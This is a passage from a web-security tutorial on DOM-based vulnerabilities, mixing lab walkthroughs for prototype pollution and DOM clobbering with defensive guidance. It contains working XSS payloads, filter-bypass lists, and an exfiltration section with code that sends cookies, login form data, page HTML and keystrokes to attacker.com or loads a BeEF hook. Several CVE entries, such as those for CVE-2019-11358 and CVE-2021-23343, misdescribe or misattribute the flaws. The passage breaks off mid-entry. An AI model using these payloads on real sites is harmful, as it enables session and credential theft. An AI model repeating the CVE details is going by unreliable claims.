#### Vulnerability Analysis
- **Pollution vector:** `__proto__.sequence`
- **Gadget:** `manager.sequence` undefined check
- **Sink:** `eval()` with concatenated code
- **Challenge:** Code appends ')' after sequence

#### Step-by-Step Solution

1. Identify eval() gadget using manager.sequence
2. Notice the code appends ')' : `eval('manager.macro(' + sequence + ')')`
3. Need to fix syntax
4. Use trailing `-` operator: `alert(1)-`
5. Final payload: `/?__proto__.sequence=alert(1)-`

#### Working Payload

```
/?__proto__.sequence=alert(1)-
```

#### Payload Breakdown

Without fix:
```javascript
eval('manager.macro(' + 'alert(1)' + ')');
// Result: manager.macro(alert(1))
// alert(1) executes but syntax error on macro call
```

With `-` fix:
```javascript
eval('manager.macro(' + 'alert(1)-' + ')');
// Result: manager.macro(alert(1)-)
// alert(1) executes, alert(1)-undefined = NaN, macro(NaN) may error but XSS achieved
```

#### Alternative Syntax Fixes

```javascript
// Using semicolon and comment
/?__proto__.sequence=alert(1);//

// Using comma operator
/?__proto__.sequence=alert(1),0

// Using boolean operator
/?__proto__.sequence=alert(1)||0

// Using void
/?__proto__.sequence=void(alert(1))

// Using assignment
/?__proto__.sequence=x=alert(1)
```

#### How It Works

**Step 1 - Pollution:**
```javascript
// URL: /?__proto__.sequence=alert(1)-
Object.prototype.sequence = 'alert(1)-';
```

**Step 2 - Check triggers:**
```javascript
let manager = {};
if (manager && manager.sequence) {
    // manager.sequence is undefined in object
    // Checks prototype chain
    // Object.prototype.sequence = 'alert(1)-' ✓
```

**Step 3 - eval() executes:**
```javascript
eval('manager.macro(' + 'alert(1)-' + ')');
// Evaluates: manager.macro(alert(1)-)
// alert(1) runs first, returns undefined
// undefined - undefined = NaN
// manager.macro(NaN) - may error but XSS achieved
```

#### Comparison of Both Prototype Pollution Labs

| Feature | Lab 10 (transport_url) | Lab 11 (sequence) |
|---------|------------------------|-------------------|
| **Source** | deparam.js URL parsing | Same or similar |
| **Gadget** | config.transport_url | manager.sequence |
| **Sink** | script.src | eval() |
| **Payload** | data:,alert(1);// | alert(1)- |
| **Technique** | Data URI | Syntax fixing |
| **Difficulty** | Standard | Requires syntax adjustment |

#### Using DOM Invader

1. Open DOM Invader in Burp's browser
2. Scan for prototype pollution sources
3. Scan for gadgets - finds `manager.sequence` in eval()
4. DOM Invader shows the eval context
5. Manually adjust payload to fix syntax
6. Test: `/?__proto__.sequence=alert(1)-`

#### Finding Gadgets Manually

**Search JavaScript files for:**
```javascript
// Property checks on objects
if (config.property)
if (options && options.property)

// In dangerous sinks
eval(code.property)
element.innerHTML = template.property
script.src = settings.property
location.href = redirect.property
```

**Testing for pollution:**
```javascript
// Browser console
Object.prototype.testprop = 'polluted';
let test = {};
console.log(test.testprop); // 'polluted' confirms pollution works
```

---

### Prototype Pollution Detection Techniques

#### Manual Detection

**1. Test basic pollution:**
```
/?__proto__[test]=polluted
/?__proto__.test=polluted
/?constructor.prototype.test=polluted
```

**2. Check in console:**
```javascript
let obj = {};
console.log(obj.test); // 'polluted' if successful
```

**3. Look for merge/extend functions:**
```javascript
// Vulnerable patterns
Object.assign(target, source)
$.extend(target, source)
_.merge(target, source)
```

#### Automated Detection with DOM Invader

1. **Enable DOM Invader**
2. **Scan for sources** - Identifies pollution vectors
3. **Scan for gadgets** - Finds exploitable properties
4. **Auto-exploit** - Generates working payloads

#### Common Gadget Patterns

```javascript
// Property existence checks
if (obj.property) { dangerous_sink(obj.property); }

// Default value patterns
let value = obj.property || default_value;

// Config object patterns
let config = loadConfig(); // May be empty object
if (config.feature) { enableFeature(); }

// Options patterns
function execute(options) {
    options = options || {};
    if (options.callback) eval(options.callback);
}
```

---

## DOM Clobbering {#dom-clobbering}

### Introduction to DOM Clobbering

DOM clobbering exploits how HTML elements with `id` or `name` attributes create global JavaScript variables.

**Basic concept:**
```html
<a id="admin"></a>

<script>
window.admin // References the <a> element
typeof admin // "object" (HTMLAnchorElement)
</script>
```

### How DOM Clobbering Works

**Single element clobbering:**
```html
<a id="username"></a>

<script>
// JavaScript code expects
if (username === 'admin') { /* privileged access */ }

// But username is now an HTMLAnchorElement
</script>
```

**Multi-element clobbering (property access):**
```html
<a id="config"></a>
<a id="config" name="apiUrl" href="https://evil.com"></a>

<script>
config // HTMLCollection with 2 elements
config.apiUrl // href value of second element: "https://evil.com"
</script>
```

### Lab 12: Exploiting DOM Clobbering to Enable XSS

**Difficulty:** Expert

#### Vulnerable Code
```javascript
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'};
let avatarImg = document.createElement('img');
avatarImg.src = defaultAvatar.avatar;
```

#### Vulnerability Analysis
- **Pattern:** `||` operator with window property
- **Clobbering target:** `window.defaultAvatar`
- **Property needed:** `.avatar` sub-property
- **Sanitization:** DOMPurify used but allows `cid:` protocol
- **Attack:** Clobber with two anchors, use cid: for attribute breakout

#### Step-by-Step Solution

1. Identify the `window.defaultAvatar || {}` pattern
2. Create two anchors with same id to make a collection
3. Use name attribute to create `.avatar` property
4. Use `cid:` protocol (allowed by DOMPurify)
5. Inject `"` via cid: to break attribute context
6. Submit comment with payload
7. XSS executes when comment loads

#### Working Payload

**Comment body:**
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

#### How the Clobbering Works

**Step 1 - HTML creates collection:**
```html
<a id=defaultAvatar></a>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//"></a>
```

**Step 2 - JavaScript accesses:**
```javascript
window.defaultAvatar
// HTMLCollection [<a id=defaultAvatar>, <a id=defaultAvatar name=avatar>]

window.defaultAvatar.avatar
// Second element's href: "cid:&quot;onerror=alert(1)//"
```

**Step 3 - Code execution:**
```javascript
let defaultAvatar = window.defaultAvatar; // Collection, truthy!
let avatarImg = document.createElement('img');
avatarImg.src = defaultAvatar.avatar; // "cid:&quot;onerror=alert(1)//"
document.body.appendChild(avatarImg);
```

**Step 4 - Rendered HTML:**
```html
<img src="cid:"onerror=alert(1)//">
```

The `cid:` protocol doesn't encode quotes, so:
```html
<img src="cid:" onerror=alert(1)//">
```

#### Why This Works

**1. Two elements with same id create collection:**
```javascript
<a id="x"></a>
<a id="x"></a>
// window.x = HTMLCollection
```

**2. Name attribute creates property:**
```javascript
<a id="x" name="prop" href="value"></a>
// window.x.prop = "value" (the href)
```

**3. cid: protocol doesn't encode:**
```
cid:&quot; → Rendered as: cid:"
```

**4. Quote breaks attribute:**
```html
<img src="cid:" onerror=alert(1)//">
```

#### Why DOMPurify Doesn't Block This

DOMPurify allows:
- `<a>` tags ✓
- `id` attributes ✓
- `name` attributes ✓
- `href` attributes ✓
- `cid:` protocol ✓ (used for email content IDs)

But it doesn't prevent DOM clobbering attacks!

#### Alternative Protocols

```html
<!-- Using cid: (works) -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

<!-- Using data: (may work) -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="data:text/html,<script>alert(1)</script>">

<!-- Note: javascript: is typically blocked by DOMPurify -->
```

#### Browser Compatibility

**Chrome/Chromium:** ✓ Works
**Firefox:** ✓ Works
**Safari:** ✓ Works
**Edge:** ✓ Works

*Note: Exact behavior may vary by browser version*

#### Complete Attack Flow

1. **Attacker posts comment** with clobbering anchors
2. **DOMPurify sanitizes** but allows the payload
3. **Browser creates** `window.defaultAvatar` as HTMLCollection
4. **JavaScript checks** `window.defaultAvatar || {}` - collection is truthy
5. **Code accesses** `defaultAvatar.avatar` - gets href value
6. **img.src is set** to `cid:&quot;onerror=alert(1)//`
7. **Browser renders** with unencoded quote
8. **Attribute breaks** and onerror handler executes
9. **XSS achieved** when victim views comment

---

### Lab 13: Clobbering DOM Attributes to Bypass HTML Filters

**Difficulty:** Expert

#### Vulnerable Code

**HTMLJanitor sanitization:**
```javascript
for (var a = 0; a < node.attributes.length; a += 1) {
    var attr = node.attributes[a];
    if (shouldRejectAttr(attr, allowedAttrs, node)) {
        node.removeAttribute(attr.name);
        a = a - 1;
    }
}
```

**Normal behavior:**
```javascript
form.attributes // NamedNodeMap {0: attr1, 1: attr2, length: 2}
form.attributes.length // 2
```

**After clobbering:**
```html
<form id=x><input id=attributes></form>
```

```javascript
form.attributes // <input id=attributes> (the element!)
form.attributes.length // undefined
```

#### Vulnerability Analysis
- **Target:** HTMLJanitor's attribute sanitization loop
- **Clobbering:** `form.attributes` property
- **Bypass:** Loop never executes (length = undefined)
- **Result:** Event handlers not removed

#### Step-by-Step Solution

1. Understand HTMLJanitor loops through `node.attributes`
2. Clobber `attributes` property with `<input id=attributes>`
3. Make `form.attributes.length` return undefined
4. Loop condition fails: `for (var a = 0; a < undefined; a++)`
5. Event handler (`onfocus`) never removed
6. Use iframe to trigger focus on clobbered form

#### Working Exploit

**Comment payload:**
```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

**Exploit server payload:**
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?postId=3"
        onload="setTimeout(()=>this.src=this.src+'#x',500)">
</iframe>
```

#### How the Clobbering Works

**Step 1 - Comment HTML:**
```html
<form id=x tabindex=0 onfocus=print()>
    <input id=attributes>
</form>
```

**Step 2 - HTMLJanitor tries to sanitize:**
```javascript
for (var a = 0; a < node.attributes.length; a += 1) {
    // node = <form id=x>
    // node.attributes = <input id=attributes> (clobbered!)
    // node.attributes.length = undefined
    // for (var a = 0; a < undefined; a += 1)
    // Condition is false, loop never runs!
    // onfocus attribute never removed!
}
```

**Step 3 - iframe triggers focus:**
```javascript
setTimeout(() => this.src = this.src + '#x', 500)
// After 500ms, adds #x fragment
// Browser scrolls to element with id="x"
// Focus event triggers
// onfocus=print() executes
```

#### Payload Breakdown

**Form attributes:**
- `id=x` - Identifier for URL fragment targeting
- `tabindex=0` - Makes form focusable
- `onfocus=print()` - Payload (should be removed but isn't)

**Input purpose:**
- `id=attributes` - Clobbers form.attributes property

**iframe onload:**
```javascript
setTimeout(() => this.src = this.src + '#x', 500)
```
- Waits 500ms for page to load
- Appends `#x` to URL
- Browser focuses element with id="x"
- onfocus event fires

#### Why the Delay is Necessary

The 500ms delay ensures:
1. Comment is fully loaded and rendered
2. DOM clobbering has taken effect
3. HTMLJanitor has run (and failed to remove onfocus)
4. Form element exists before focusing

#### Alternative Event Handlers

```html
<!-- Using onanimationstart -->
<form id=x style="animation:x 1ms" onanimationstart=print()>
    <input id=attributes>
</form>

<!-- Using onmouseover (less reliable) -->
<form id=x onmouseover=print()>
    <input id=attributes>
</form>

<!-- Using onclick (requires actual click) -->
<form id=x onclick=print()>
    <input id=attributes>
</form>
```

#### Why onfocus is Best

- Can be triggered programmatically via URL fragment
- Doesn't require user interaction (automated)
- Reliable across browsers
- Works with iframe delivery

#### Testing the Clobbering

**In browser console:**
```javascript
// Before clobbering
let form = document.createElement('form');
console.log(form.attributes); // NamedNodeMap
console.log(form.attributes.length); // 0

// After clobbering (in actual page)
// <form id=x><input id=attributes></form>
let clobberedForm = document.getElementById('x');
console.log(clobberedForm.attributes); // <input> element
console.log(clobberedForm.attributes.length); // undefined
```

#### HTMLJanitor Vulnerability Pattern

**Vulnerable code:**
```javascript
// Assumes attributes is always a NamedNodeMap
for (var i = 0; i < node.attributes.length; i++) {
    // Sanitize attributes
}
```

**Secure alternative:**
```javascript
// Use Array.from to ensure proper iteration
let attrs = Array.from(node.attributes);
for (var i = 0; i < attrs.length; i++) {
    // Sanitize attributes
}
```

---

### DOM Clobbering Patterns and Techniques

#### Basic Clobbering

**1. Single element:**
```html
<img id="admin">

<script>
typeof admin // "object" (HTMLImageElement)
</script>
```

**2. Form with named input:**
```html
<form id="config">
    <input name="apiUrl" value="https://evil.com">
</form>

<script>
config.apiUrl.value // "https://evil.com"
</script>
```

**3. Anchor with name:**
```html
<a id="settings" name="theme" href="dark"></a>

<script>
settings.theme // The anchor element
settings.theme.href // "dark"
</script>
```

#### Advanced Clobbering

**1. Multiple elements (HTMLCollection):**
```html
<a id="config"></a>
<a id="config" name="url" href="https://evil.com"></a>

<script>
config // HTMLCollection [<a>, <a>]
config.url // href of second element
</script>
```

**2. Nested properties:**
```html
<form id="app">
    <form id="settings">
        <input name="debug" value="true">
    </form>
</form>

<script>
app.settings.debug.value // "true"
</script>
```

**3. Clobbering arrays:**
```html
<a id="users"></a>
<a id="users" name="length" href="0"></a>

<script>
users.length // href value "0" (string, not number!)
</script>
```

#### Finding Clobberable Patterns

**Vulnerable code patterns:**
```javascript
// Pattern 1: OR with window property
let config = window.config || {default: 'value'};

// Pattern 2: Direct property access
if (window.admin) { /* privileged */ }

// Pattern 3: Property checks
if (settings && settings.debug) { eval(settings.debug); }

// Pattern 4: Array-like access
for (let i = 0; i < items.length; i++) { /* ... */ }
```

**Using DOM Invader:**
1. Enable DOM Invader
2. Navigate to target page
3. DOM Invader highlights clobberable variables
4. Check "DOM clobbering" tab for opportunities
5. Test payloads manually

---

## Advanced Exploitation Techniques {#advanced-techniques}

### Chaining Multiple Vulnerabilities

#### DOM XSS + CSRF

**Scenario:** Use DOM XSS to perform state-changing actions

```html
<!-- Steal CSRF token and submit form -->
<img src=x onerror="
    let token = document.querySelector('[name=csrf]').value;
    fetch('/api/change-email', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: 'attacker@evil.com', csrf: token})
    });
">
```

#### DOM XSS + Clickjacking

**Exploit server:**
```html
<style>
    iframe { position:absolute; width:100%; height:100%; opacity:0.1; }
    button { position:absolute; top:300px; left:400px; z-index:-1; }
</style>
<iframe src="https://target.com/?xss=<img src=x onerror=alert(1)>"></iframe>
<button>Click me for prize!</button>
```

#### Prototype Pollution + DOM XSS

**Step 1 - Pollute:**
```
/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

**Step 2 - Trigger gadget:**
```javascript
let div = document.createElement('div');
if (div.innerHTML) { // Polluted property!
    // Some code that uses it
}
```

### Bypassing WAFs and Filters

#### Character Encoding

**HTML entities:**
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

**JavaScript Unicode:**
```javascript
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
<img src=x onerror="\x61\x6c\x65\x72\x74(1)">
```

**Hex encoding:**
```javascript
<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">
```

**Base64:**
```javascript
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

#### Tag and Attribute Variations

**SVG vectors:**
```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

**Using less common tags:**
```html
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<select onfocus=alert(1) autofocus>
```

**Alternative attributes:**
```html
<img src=x onerror=alert(1)>
<img src=x onload=alert(1)>
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
```

#### Keyword Bypasses

**Splitting "alert":**
```javascript
<img src=x onerror="ale"+"rt(1)">
<img src=x onerror="window['ale'+'rt'](1)">
<img src=x onerror="(alert)(1)">
<img src=x onerror="[alert][0](1)">
```

**Using eval:**
```javascript
<img src=x onerror="eval('ale'+'rt(1)')">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

**Using Function constructor:**
```javascript
<img src=x onerror="Function('ale'+'rt(1)')()">
<img src=x onerror="[].constructor.constructor('ale'+'rt(1)')()">
```

#### Context-Specific Bypasses

**Breaking out of script tags:**
```html
</script><img src=x onerror=alert(1)>
</script><svg onload=alert(1)>
```

**Breaking out of attributes:**
```html
" onclick="alert(1)
' onclick='alert(1)
" onfocus="alert(1)" autofocus="
```

**Breaking out of JavaScript strings:**
```javascript
'; alert(1); //
\'; alert(1); //
'; alert(1); var x='
```

### Exfiltration Techniques

#### Cookie Theft

**Simple fetch:**
```javascript
fetch('https://attacker.com?c='+document.cookie)
```

**Image tag:**
```javascript
new Image().src='https://attacker.com?c='+document.cookie
```

**Form submission:**
```javascript
let f=document.createElement('form');
f.action='https://attacker.com';
f.method='POST';
let i=document.createElement('input');
i.name='cookies';
i.value=document.cookie;
f.appendChild(i);
document.body.appendChild(f);
f.submit();
```

#### Credential Harvesting

**Replace login form:**
```javascript
document.forms[0].action='https://attacker.com/steal';
```

**Add event listener:**
```javascript
document.querySelector('form').addEventListener('submit', e => {
    fetch('https://attacker.com', {
        method: 'POST',
        body: new FormData(e.target)
    });
});
```

#### Page Content Exfiltration

**Send full HTML:**
```javascript
fetch('https://attacker.com', {
    method: 'POST',
    body: document.documentElement.outerHTML
});
```

**Send specific elements:**
```javascript
let sensitiveData = document.querySelector('.user-profile').innerHTML;
fetch('https://attacker.com?data='+btoa(sensitiveData));
```

### Keylogging

```javascript
document.addEventListener('keypress', e => {
    fetch('https://attacker.com?key='+e.key);
});
```

### BeEF Integration

```javascript
let s=document.createElement('script');
s.src='https://attacker.com:3000/hook.js';
document.body.appendChild(s);
```

---

## Detection and Prevention {#detection-and-prevention}

### Detection Techniques

#### Manual Code Review

**Look for dangerous sinks:**
```bash
# Search JavaScript files
grep -r "innerHTML" *.js
grep -r "document.write" *.js
grep -r "eval(" *.js
grep -r "Function(" *.js
grep -r "\.html(" *.js
grep -r "\.attr(" *.js
```

**Look for attacker-controllable sources:**
```bash
grep -r "location.search" *.js
grep -r "location.hash" *.js
grep -r "location.href" *.js
grep -r "document.referrer" *.js
grep -r "postMessage" *.js
```

**Trace data flow:**
1. Find source (e.g., `location.search`)
2. Follow variable through code
3. Check if it reaches sink without sanitization
4. Verify context and exploitability

#### Browser DevTools

**1. Network tab:**
- Monitor AJAX requests
- Check if sensitive data sent to external domains
- Verify XSS execution

**2. Console tab:**
- Test payloads interactively
- Check for JavaScript errors
- Verify object properties

**3. Sources/Debugger:**
- Set breakpoints on dangerous sinks
- Step through code execution
- Inspect variable values

**4. Elements tab:**
- Inspect rendered DOM
- Verify payload injection
- Check computed styles

#### Static Analysis Tools

**ESLint with security plugins:**
```bash
npm install --save-dev eslint-plugin-security
```

```json
{
  "plugins": ["security"],
  "extends": ["plugin:security/recommended"]
}
```

**Semgrep rules:**
```yaml
rules:
  - id: dom-xss-innerHTML
    pattern: $X.innerHTML = $SOURCE
    message: Potential DOM XSS via innerHTML
    severity: WARNING
```

**NodeJsScan, Retire.js, Snyk Code**

#### Dynamic Analysis

**Burp Suite Scanner:**
- Automatically crawls and scans
- Detects DOM-based vulnerabilities
- Provides PoC payloads

**OWASP ZAP:**
- Active scanning for DOM XSS
- Spider for JavaScript analysis
- DOM XSS detection

**DOM Invader (Burp Suite):**
- Automatic source/sink detection
- Prototype pollution scanning
- Gadget discovery
- One-click exploitation

### Prevention Best Practices

#### Input Validation

**Whitelist approach:**
```javascript
// Good - whitelist allowed values
const allowedValues = ['option1', 'option2', 'option3'];
if (allowedValues.includes(userInput)) {
    // Safe to use
}

// Bad - blacklist (easy to bypass)
if (!userInput.includes('<script>')) {
    // Still vulnerable!
}
```

**Type validation:**
```javascript
// Ensure input is expected type
let page = parseInt(userInput);
if (isNaN(page) || page < 1 || page > 100) {
    throw new Error('Invalid page number');
}
```

#### Output Encoding

**HTML context:**
```javascript
function htmlEncode(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// Usage
element.textContent = userInput; // Automatically encoded
element.innerHTML = htmlEncode(userInput); // Manual encoding
```

**JavaScript context:**
```javascript
function jsEncode(str) {
    return String(str)
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/"/g, '\\"')
        .replace(/\n/g, '\\n')
        .replace(/\r/g, '\\r');
}
```

**URL context:**
```javascript
let safe = encodeURIComponent(userInput);
```

#### Use Safe APIs

**Instead of dangerous sinks:**
```javascript
// Bad
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);

// Good
element.textContent = userInput;
element.innerText = userInput;
// Or use DOMPurify for rich content
element.innerHTML = DOMPurify.sanitize(userInput);
```

**Safe jQuery methods:**
```javascript
// Bad
$(userInput);
$element.html(userInput);

// Good
$element.text(userInput);
```

#### Content Security Policy (CSP)

**Strict CSP:**
```http
Content-Security-Policy:
    default-src 'none';
    script-src 'nonce-{random}' 'strict-dynamic';
    style-src 'nonce-{random}';
    img-src 'self';
    connect-src 'self';
    base-uri 'none';
    object-src 'none';
```

**Key directives:**
- `script-src` - Controls script sources
- `object-src 'none'` - Prevents Flash/plugin exploits
- `base-uri 'none'` - Prevents base tag injection
- `'strict-dynamic'` - Allows nonce-approved scripts to load others

**Nonce example:**
```html
<script nonce="r4nd0m">
    // Trusted script
</script>
```

#### Sanitization Libraries

**DOMPurify:**
```javascript
import DOMPurify from 'dompurify';

let clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: ['href']
});
element.innerHTML = clean;
```

**Configuration options:**
```javascript
DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em'],
    ALLOWED_ATTR: ['href', 'title'],
    FORBID_TAGS: ['script', 'style'],
    FORBID_ATTR: ['onclick', 'onerror'],
    ALLOW_DATA_ATTR: false,
    SANITIZE_DOM: true
});
```

#### Framework-Specific Protections

**React:**
```jsx
// Automatically escapes
<div>{userInput}</div>

// Dangerous (avoid)
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Safe alternative
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />
```

**Vue:**
```vue
<!-- Automatically escaped -->
<div>{{ userInput }}</div>

<!-- Dangerous (avoid) -->
<div v-html="userInput"></div>

<!-- Safe alternative -->
<div v-html="$sanitize(userInput)"></div>
```

**Angular:**
```typescript
// Automatically sanitized
template: '<div>{{userInput}}</div>'

// For trusted HTML
import { DomSanitizer } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

getTrustedHtml() {
    return this.sanitizer.sanitize(SecurityContext.HTML, userInput);
}
```

#### Preventing Prototype Pollution

**1. Freeze Object.prototype:**
```javascript
Object.freeze(Object.prototype);
```

**2. Use Map instead of objects:**
```javascript
// Instead of
let obj = {};
obj[userKey] = userValue;

// Use
let map = new Map();
map.set(userKey, userValue);
```

**3. Validate keys:**
```javascript
function safeMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue; // Skip dangerous keys
        }
        target[key] = source[key];
    }
}
```

**4. Use Object.create(null):**
```javascript
let obj = Object.create(null); // No prototype
obj.toString // undefined (safe)
```

#### Preventing DOM Clobbering

**1. Check property type:**
```javascript
// Bad
if (window.config) { /* ... */ }

// Good
if (typeof window.config === 'object' && window.config.constructor === Object) {
    // Ensure it's a plain object, not HTML element
}
```

**2. Use strict checks:**
```javascript
// Bad
let value = window.value || default;

// Good
let value = (typeof window.value === 'string') ? window.value : default;
```

**3. Avoid global namespace:**
```javascript
// Bad
let config = window.config || {};

// Good
let config = (function() {
    try {
        return JSON.parse(localStorage.getItem('config')) || {};
    } catch {
        return {};
    }
})();
```

#### Preventing Web Message Vulnerabilities

**Always validate origin:**
```javascript
window.addEventListener('message', function(e) {
    // Validate origin
    if (e.origin !== 'https://trusted.com') {
        return; // Reject messages from untrusted origins
    }

    // Validate message format
    let data;
    try {
        data = JSON.parse(e.data);
    } catch {
        return; // Invalid JSON
    }

    // Sanitize before use
    if (data.action === 'updateContent') {
        element.textContent = data.content; // Use textContent, not innerHTML
    }
});
```

**Whitelist target origin when sending:**
```javascript
// Bad
targetWindow.postMessage(message, '*');

// Good
targetWindow.postMessage(message, 'https://trusted.com');
```

---

## Tools and Automation {#tools-and-automation}

### Burp Suite DOM Invader

**Features:**
- Automatic source detection
- Sink identification
- Prototype pollution scanning
- Gadget discovery
- DOM clobbering detection
- One-click exploitation

**Setup:**
1. Open Burp Suite Professional
2. Launch Burp's built-in browser
3. Press F12 → DOM Invader tab
4. Enable DOM Invader

**Configuration:**
```
- Canary: Custom test string
- Inject URL params: Auto-inject into parameters
- Inject forms: Auto-inject into form inputs
- Show sinks: Display detected sinks
- Show sources: Display detected sources
- Prototype pollution: Enable scanning
- DOM clobbering: Enable detection
```

**Workflow:**
1. Navigate to target page
2. DOM Invader auto-injects canary
3. Review "Sources" panel for injection points
4. Review "Sinks" panel for dangerous functions
5. Click sinks to see stack traces and context
6. Scan for prototype pollution
7. Scan for gadgets
8. Generate exploits automatically

### XSS Hunter

**Purpose:** Detect blind XSS

**Setup:**
```html
<script src="https://your-xsshunter.com/your-id"></script>
```

**Features:**
- Captures page HTML
- Screenshots
- Cookies
- Origin information
- HTTP referrer

**Payload injection:**
```
"><script src=https://your-xsshunter.com/id></script>
```

### DalFox

**Installation:**
```bash
go install github.com/hahwul/dalfox/v2@latest
```

**Basic usage:**
```bash
# Single URL
dalfox url https://target.com?param=value

# From file
dalfox file urls.txt

# Pipeline mode
cat urls.txt | dalfox pipe

# With custom payloads
dalfox url https://target.com?q=test --custom-payload payloads.txt
```

**Advanced options:**
```bash
# DOM analysis
dalfox url https://target.com?param=value --mining-dom

# Include all parameters
dalfox url https://target.com?a=1&b=2 --mining-all-param

# With blind XSS
dalfox url https://target.com?param=value --blind https://xsshunter.com/id
```

### XSStrike

**Installation:**
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
```

**Usage:**
```bash
# Basic scan
python xsstrike.py -u "https://target.com?param=value"

# With crawling
python xsstrike.py -u "https://target.com" --crawl

# Fuzzing mode
python xsstrike.py -u "https://target.com?param=value" --fuzzer

# Skip DOM scanning
python xsstrike.py -u "https://target.com?param=value" --skip-dom
```

### Custom Scripts

#### JavaScript Source/Sink Finder

```javascript
// Run in browser console
(function() {
    // Sources
    const sources = [
        'location.search',
        'location.hash',
        'location.href',
        'document.referrer',
        'document.cookie',
        'window.name'
    ];

    // Sinks
    const sinks = [
        'innerHTML',
        'outerHTML',
        'document.write',
        'document.writeln',
        'eval',
        'Function',
        'setTimeout',
        'setInterval',
        'location',
        'location.href'
    ];

    console.log('=== DOM XSS Detection ===');

    // Check for sources in page scripts
    document.querySelectorAll('script').forEach(script => {
        let code = script.textContent;
        sources.forEach(source => {
            if (code.includes(source)) {
                console.log(`[SOURCE FOUND] ${source} in script`);
            }
        });
        sinks.forEach(sink => {
            if (code.includes(sink)) {
                console.log(`[SINK FOUND] ${sink} in script`);
            }
        });
    });
})();
```

#### Prototype Pollution Detector

```javascript
// Run in browser console
(function() {
    console.log('=== Testing Prototype Pollution ===');

    // Test __proto__
    let testObj1 = {};
    Object.prototype.polluted = 'yes';

    if (testObj1.polluted === 'yes') {
        console.log('[VULNERABLE] Prototype pollution possible');
        console.log('[TEST] Try: /?__proto__[test]=polluted');
    }

    // Clean up
    delete Object.prototype.polluted;

    // Check for common pollution sources
    let url = new URL(window.location.href);
    url.searchParams.forEach((value, key) => {
        if (key.includes('__proto__') || key.includes('constructor') || key.includes('prototype')) {
            console.log(`[ALERT] Potential pollution vector in URL: ${key}`);
        }
    });
})();
```

#### DOM Clobbering Detector

```javascript
// Run in browser console
(function() {
    console.log('=== Testing DOM Clobbering ===');

    // Check for clobberable variables
    let suspiciousVars = [];

    for (let prop in window) {
        let val = window[prop];
        if (val && typeof val === 'object') {
            if (val instanceof HTMLElement || val instanceof HTMLCollection) {
                suspiciousVars.push(prop);
            }
        }
    }

    if (suspiciousVars.length > 0) {
        console.log('[FOUND] Potentially clobbered variables:');
        suspiciousVars.forEach(v => {
            console.log(`  - window.${v} =`, window[v]);
        });
    }

    // Test if we can clobber
    console.log('[TEST] Try adding: <a id="testClobber"></a>');
})();
```

### Automated Scanning

#### Nuclei Template for DOM XSS

```yaml
id: dom-xss-detection

info:
  name: DOM XSS Detection
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?param=<img src=x onerror=alert(1)>"
      - "{{BaseURL}}/#<img src=x onerror=alert(1)>"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<img src=x onerror=alert(1)>"
        part: body

      - type: status
        status:
          - 200
```

#### Sqlmap for Testing

While sqlmap is for SQL injection, similar automated approaches can test for DOM XSS:

```bash
# Create payload list
cat > dom-payloads.txt << EOF
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
{{alert(1)}}
EOF

# Use with ffuf
ffuf -w dom-payloads.txt -u https://target.com/?FUZZ
```

---

## Real-World Examples {#real-world-examples}

### CVE Examples

#### CVE-2020-6095 - jQuery File Upload DOM XSS

**Vulnerability:**
```javascript
// Unsafe use of jQuery text() method with user input
$element.text(options.context);
```

**Exploit:**
```javascript
/?context=<img src=x onerror=alert(document.domain)>
```

**Impact:** Affected thousands of sites using the popular jQuery File Upload plugin

#### CVE-2021-23343 - PostMessage XSS in Facebook SDK

**Vulnerability:**
```javascript
window.addEventListener('message', function(event) {
    // No origin validation
    window.location = event.data.redirect;
});
```

**Exploit:**
```html
<iframe src="https://target.com/page-with-sdk"></iframe>
<script>
    setTimeout(() => {
        frames[0].postMessage({redirect: 'javascript:alert(document.domain)'}, '*');
    }, 1000);
</script>
```

#### CVE-2019-11358 - jQuery XSS via location.hash

**Vulnerability:**
```javascript
// jQuery <3.4.0
$(location.hash) // Unsafe selector
```

**Exploit:**
```
https://target.com#<img src=x onerror=alert(1)>
```

**Fix:** jQuery 3.4.0+ sanitizes selectors

#### CVE-2020-35234 - Ghost CMS Prototype Pollution

**Vulnerability:**
```javascript
// Unsafe merge function
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];
    }
}
```

**Exploit:**
